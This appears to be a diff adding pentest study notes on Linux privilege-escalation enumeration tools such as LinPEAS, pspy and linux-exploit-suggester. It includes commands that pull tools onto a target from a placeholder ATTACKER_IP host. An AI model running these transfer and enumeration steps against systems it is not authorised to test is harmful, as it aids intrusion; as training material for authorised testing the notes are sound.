@@ -1,0 +1,57 @@
+# Automated Enumeration Tools
+
+## LinPEAS
+Most popular all-in-one Linux enumeration script — color-coded output flags likely PrivEsc vectors.
+```bash
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh | tee linpeas_output.txt
+```
+- Red/yellow highlights = high-probability vectors
+- Look for: SUID binaries, sudo rules, cron jobs, capabilities, kernel exploits
+
+## LinEnum
+Older, lighter Bash script, good if LinPEAS won't run.
+```bash
+./LinEnum.sh -t          # -t = thorough (includes cron/SUID checks)
+```
+
+## Linux Smart Enumeration (lse.sh)
+Levels of verbosity (0-2) to control noise.
+```bash
+./lse.sh -l1
+```
+
+## pspy
+Monitors processes **without root** — great for catching cron jobs/scripts run by root in real time.
+```bash
+./pspy64
+# watch for root-owned processes executing scripts you can write to
+```
+
+## linux-exploit-suggester (LES)
+Cross-references kernel/OS version against known CVEs.
+```bash
+./linux-exploit-suggester.sh
+```
+
+## GTFOBins (web reference, not a script)
+https://gtfobins.github.io/ — lookup table for abusing SUID/sudo/capabilities on standard binaries (e.g. `find`, `vim`, `python`).
+
+## Getting Tools Onto the Target
+```bash
+# Python HTTP server on attacker box
+python3 -m http.server 8000
+
+# On target
+wget http://ATTACKER_IP:8000/linpeas.sh
+curl http://ATTACKER_IP:8000/linpeas.sh -o linpeas.sh
+```
+
+## Workflow
+1. Run LinPEAS/LinEnum first for a broad sweep
+2. Cross-check kernel version with `linux-exploit-suggester`
+3. Run `pspy` in background if cron jobs are suspected
+4. Manually verify anything flagged before exploiting (false positives happen)
+
+> Tools speed up recon — they don't replace understanding *why* something is exploitable.
